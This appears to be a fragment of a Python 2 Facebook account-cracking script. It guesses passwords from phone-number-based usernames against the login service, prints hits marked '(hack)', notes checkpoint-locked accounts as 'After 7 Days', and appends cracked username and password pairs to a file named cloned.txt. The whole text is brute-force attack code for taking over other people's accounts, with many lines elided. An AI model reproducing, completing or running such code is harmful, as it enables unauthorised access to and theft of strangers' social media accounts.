...
while loop == 'true':
    ...
    if passcode == CorrectPasscode:
        ...
        os.system('xdg-open https://www.youtube.com/channel/UCrsOzgZeCbfwn2HHrZFDEbQ')
...
def action():
    ...
    if peak == '':
        ...
        os.system('clear')
        print logo2
        print 'Enter any \033[1;33m\x1b[31m    secret  \033[1;33m      code Number' + '\n'
        print 'first three digits and the last seven digits of any phone number in this country.Write the remaining digits here.\033[1;93m\x1b[31m  love u queen  \x1b[31m\033[1;93m'
        try:
    ...
    def main(arg):
        ...
        try:
            ...
            if 'access_token' in q:
                print '\x1b[1;93m(Hack)  ' + k + c + user + '  Jogi  ' + pass1                                       
                ...
                if 'www.facebook.com' in q['error_msg']:
                    print '\033[1;95m( After 7 Days) ' + k + c + user + '  Jogi  ' + pass1
                    ...
                    q = json.load(data)
                    if 'access_token' in q:
                        print '\x1b[1;93m(hack)  ' + k + c + user +  '  Jogi  ' + pass2
                        okb = open('save/cloned.txt', 'a')
                        okb.write(k+c+saba+pass2+'\n')
                        okb.close()
                        oks.append(c+user+pass2)
                    else:
                        if 'www.facebook.com' in q['error_msg']:
                            print '\033[1;97m( After 7 Days) ' + k + c + user + '  Jogi  ' + pass2
                            cps = open('save/cloned.txt', 'a')
                            ...
                            q = json.load(data)
                            if 'access_token' in q:
                                print '\x1b[1;93m(hack)  ' + k + c + user + '  Jogi  ' + pass3
                                okb = open('save/cloned.txt', 'a')
                                ...
                                if 'www.facebook.com' in q['error_msg']:
                                    print '\x1b[1;92m(72 Hours) ' + k + c + user + '  Jogi  ' + pass3 
                                    cps = open('save/cloned.txt', 'a')
                                    ...
                                    q = json.load(data)
                                    if 'access_token' in q:
                                        print '\x1b[1;93m(hack)  ' + k + c + user + '  Jogi  ' + pass4 
                                        okb = open('save/cloned.txt', 'a')
                                        ...
                                        if 'www.facebook.com' in q['error_msg']:
                                            print '\033[1;97m( After 7 Days) ' + k + c + user + '  Jogi  ' + pass4
                                            cps = open('save/cloned.txt', 'a')
                                            ...
                                            q = json.load(data)
                                            if 'access_token' in q:
                                                print '\x1b[1;93m(hack)  ' + k + c + user + '  Jogi  ' + pass5
                                                okb = open('save/cloned.txt', 'a')
